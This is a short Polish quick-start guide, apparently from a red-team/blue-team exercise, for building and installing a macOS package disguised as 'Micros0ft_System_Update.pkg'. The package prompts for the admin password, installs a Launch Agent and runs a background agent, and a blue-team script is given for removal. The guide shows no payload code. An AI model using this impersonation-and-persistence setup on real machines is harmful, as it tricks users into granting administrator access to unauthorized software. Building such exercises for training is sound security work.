# Szybki Start - Budowanie Pakietu .pkg

## 🚀 W 3 Krokach

### 1. Przygotuj Skrypty

```bash
cd red_team/pkg
chmod +x build.sh scripts/preinstall scripts/postinstall
```

### 2. Zbuduj Pakiet

```bash
./build.sh
```

### 3. Zainstaluj

```bash
open dist/Micros0ft_System_Update.pkg
```

## ✅ Gotowe!

Pakiet automatycznie:
- Poprosi o hasło administratora
- Zainstaluje Launch Agent
- Uruchomi agenta w tle

## 📋 Weryfikacja

```bash
# Sprawdź czy agent działa
launchctl list | grep bugbusters

# Sprawdź logi
tail -f /Users/Shared/Micros0ft/agent.log
```

## 🗑️ Odinstalowanie

```bash
cd ../../blue_team
sudo ./defender.sh
```

---

**Więcej informacji:** Zobacz `README.md` w tym katalogu

